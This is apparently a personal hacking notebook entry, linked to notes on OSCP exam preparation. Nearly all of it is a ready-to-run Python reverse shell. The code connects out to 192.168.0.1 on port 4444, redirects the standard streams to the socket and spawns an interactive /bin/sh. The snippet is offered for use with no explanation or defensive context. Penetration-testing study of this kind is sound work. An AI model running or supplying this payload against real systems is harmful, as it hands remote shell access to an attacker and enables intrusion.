# Python Reverse Shell Code 
```python
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("192.168.0.1",4444));os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(["/bin/sh","-i"])
```

` zet/20221003150561/README.md `

# Related

- [20221003150275](/zet/20221003150275/README.md) firefox reverse shell toolbar hacktools
- [20221014190001](/zet/20221014190001/README.md) kb file named kb/hacking/common-commands.md
- [20221009005402](/zet/20221009005402/README.md) preparing for the OSCP exam

Tags:

    #hacking
